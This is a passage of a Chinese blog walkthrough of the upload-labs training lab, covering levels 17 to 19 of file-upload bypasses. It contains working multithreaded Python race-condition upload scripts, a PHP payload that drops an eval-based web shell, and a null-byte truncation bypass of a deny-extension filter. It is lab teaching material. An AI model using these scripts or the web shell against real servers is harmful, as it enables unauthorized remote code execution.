<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.url = <span class="string">"http://172.16.5.129/upload/shell.php"</span></div><div class="line">        self.uploadUrl = <span class="string">"http://172.16.5.129/Pass-17/index.php"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">'try to call uploaded file...'</span>)</div><div class="line">        r = requests.get(self.url)</div><div class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</div><div class="line">            print(<span class="string">"[*]create file info.php success"</span>)</div><div class="line">            <span class="comment">#os._exit(0)</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"upload file....."</span>)</div><div class="line">        hh = hackhttp.hackhttp()</div><div class="line">        raw = <span class="string">"""</span></div><div class="line">        POST /Pass-17/index.php?action=show_code HTTP/1.1</div><div class="line">Host: 172.16.5.129</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://172.16.5.129/Pass-17/index.php?action=show_code</div><div class="line">Content-Type: multipart/form-data; boundary=---------------------------7566250541346608691122113904</div><div class="line">Content-Length: 413</div><div class="line">Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------7566250541346608691122113904</div><div class="line">Content-Disposition: form-data; name="upload_file"; filename="shell.php"</div><div class="line">Content-Type: text/php</div><div class="line"></div><div class="line">&lt;?php fputs(fopen("./info.php", "w"), '&lt;?php @eval($_POST["drops"]) ?&gt;'); ?&gt;</div><div class="line">-----------------------------7566250541346608691122113904</div><div class="line">Content-Disposition: form-data; name="submit"</div><div class="line"></div><div class="line">上传</div><div class="line">-----------------------------7566250541346608691122113904--</div><div class="line">        """</div><div class="line">        code, head, html, redirect, log = hh.http(<span class="string">'http://172.16.5.129/Pass-17/index.php'</span>, raw=raw)</div><div class="line">        print(str(code) + <span class="string">"\r"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">                self._get()</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">                self._upload()</div><div class="line">                self._get()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    threads = <span class="number">20</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t = RaceCondition()</div><div class="line">        t.start()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t.join()</div></pre></td></tr></table></figure>
<p>执行之后我们边可以发现在网站uploads目录下出现了我们想要的info.php<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.10.05.png" alt="image"></p>
<h3 id="0x18-Pass-18"><a href="#0x18-Pass-18" class="headerlink" title="0x18 Pass-18"></a>0x18 Pass-18</h3><p>分析下题目，发现这个过滤只能上传指定文件，又看了apache版本，应该是有个解析漏洞。但是普通上传一个文件会被重命名，重命名后我们就找不到我们上传的shell了，所以我们在这里要让文件上传且不重命名，那么只能通过条件竞争来解决了，修改一下上题的脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.uploadUrl = <span class="string">"http://172.16.5.129/Pass-18/index.php"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"upload file....."</span>)</div><div class="line">        hh = hackhttp.hackhttp()</div><div class="line">        raw = <span class="string">"""</span></div><div class="line">POST /Pass-18/index.php HTTP/1.1</div><div class="line">Host: 172.16.5.129</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://172.16.5.129/Pass-18/index.php?action=show_code</div><div class="line">Content-Type: multipart/form-data; boundary=---------------------------385016806609230031127102121</div><div class="line">Content-Length: 352</div><div class="line">Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------385016806609230031127102121</div><div class="line">Content-Disposition: form-data; name="upload_file"; filename="test.php.7Z"</div><div class="line">Content-Type: text/php</div><div class="line"></div><div class="line">&lt;?php phpinfo();?&gt;</div><div class="line">-----------------------------385016806609230031127102121</div><div class="line">Content-Disposition: form-data; name="submit"</div><div class="line"></div><div class="line">上传</div><div class="line">-----------------------------385016806609230031127102121--</div><div class="line">        """</div><div class="line">        code, head, html, redirect, log = hh.http(self.uploadUrl, raw=raw)</div><div class="line">        print(str(code) + <span class="string">"\r"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">                self._upload()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    threads = <span class="number">20</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t = RaceCondition()</div><div class="line">        t.start()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t.join()</div></pre></td></tr></table></figure>
<p>可以看到只要我们足够快，我们的未重命名的文件就可以存在，哈哈<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.35.54.png" alt="image"></p>
<h3 id="0x19-Pass-19"><a href="#0x19-Pass-19" class="headerlink" title="0x19 Pass-19"></a>0x19 Pass-19</h3><p>分析了一下代码，发现过滤的还是挺严的，但是重命名这里还是有文章可以做的，使用00截断的方式就好了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line"></div><div class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</div><div class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</div><div class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                $msg = <span class="string">'上传失败！'</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="0x20-总结"><a href="#0x20-总结" class="headerlink" title="0x20 总结"></a>0x20 总结</h3><p>bypass思路–考虑三个地方的特性：代码、容器、操作系统</p>
<p>危害–getshell、xss(如果文件名被存入数据库的话，可以造成xss)</p>
<p>PS:upload-labs的GitHub上写的是不是前端验证看速度，我感觉说的不好，应该右键看眼源码就好了，速度这种东西谁说的准呢。</p>
<p>最后附一张上传漏洞的脑图<br><img src="http://ok44mzy2k.bkt.clouddn.com/fileupload2.png" alt="image"></p>
<h3 id="0x21-参考"><a href="#0x21-参考" class="headerlink" title="0x21 参考"></a>0x21 参考</h3><p><a href="https://www.cnblogs.com/engeng/articles/5948089.html" target="_blank" rel="external">https://www.cnblogs.com/engeng/articles/5948089.html</a><br><a href="https://paper.tuisec.win/detail/d511228cd560003" target="_blank" rel="external">https://paper.tuisec.win/detail/d511228cd560003</a><br><a href="https://paper.tuisec.win/detail/e5e5fd3a08d8ff7" target="_blank" rel="external">https://paper.tuisec.win/detail/e5e5fd3a08d8ff7</a><br><a href="http://www.freebuf.com/vuls/128846.html" target="_blank" rel="external">http://www.freebuf.com/vuls/128846.html</a><br><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/54086.html</a></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Pass-01"><span class="toc-number">2.</span> <span class="toc-text">0x01 Pass-01</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-禁用js"><span class="toc-number">2.1.</span> <span class="toc-text">(1) 禁用js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-上传按钮处修改"><span class="toc-number">2.2.</span> <span class="toc-text">(2) 上传按钮处修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-构造上传点"><span class="toc-number">2.3.</span> <span class="toc-text">(3) 构造上传点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-修改js代码"><span class="toc-number">2.4.</span> <span class="toc-text">(4) 修改js代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Pass-02"><span class="toc-number">3.</span> <span class="toc-text">0x02 Pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Pass-03"><span class="toc-number">4.</span> <span class="toc-text">0x03 Pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Pass-04"><span class="toc-number">5.</span> <span class="toc-text">0x04 Pass-04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-Pass-05"><span class="toc-number">6.</span> <span class="toc-text">0x05 Pass-05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-Pass-06"><span class="toc-number">7.</span> <span class="toc-text">0x06 Pass-06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-Pass-07"><span class="toc-number">8.</span> <span class="toc-text">0x07 Pass-07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-Pass-08"><span class="toc-number">9.</span> <span class="toc-text">0x08 Pass-08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-Pass-09"><span class="toc-number">10.</span> <span class="toc-text">0x09 Pass-09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-Pass-10"><span class="toc-number">11.</span> <span class="toc-text">0x10 Pass-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-Pass-11"><span class="toc-number">12.</span> <span class="toc-text">0x11 Pass-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-Pass-12"><span class="toc-number">13.</span> <span class="toc-text">0x12 Pass-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-Pass-13"><span class="toc-number">14.</span> <span class="toc-text">0x13 Pass-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-Pass-14"><span class="toc-number">15.</span> <span class="toc-text">0x14 Pass-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-Pass-15"><span class="toc-number">16.</span> <span class="toc-text">0x15 Pass-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-Pass-16"><span class="toc-number">17.</span> <span class="toc-text">0x16 Pass-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x17-Pass-17"><span class="toc-number">18.</span> <span class="toc-text">0x17 Pass-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x18-Pass-18"><span class="toc-number">19.</span> <span class="toc-text">0x18 Pass-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x19-Pass-19"><span class="toc-number">20.</span> <span class="toc-text">0x19 Pass-19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x20-总结"><span class="toc-number">21.</span> <span class="toc-text">0x20 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x21-参考"><span class="toc-number">22.</span> <span class="toc-text">0x21 参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/06/18/upload-labs-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&text=文件上传漏洞天书"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&is_video=false&description=文件上传漏洞天书"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=文件上传漏洞天书&body=Check out this article: http://zer0yu.github.io/2018/06/18/upload-labs-note/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&name=文件上传漏洞天书&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 z3r0yu
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-129276044-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->


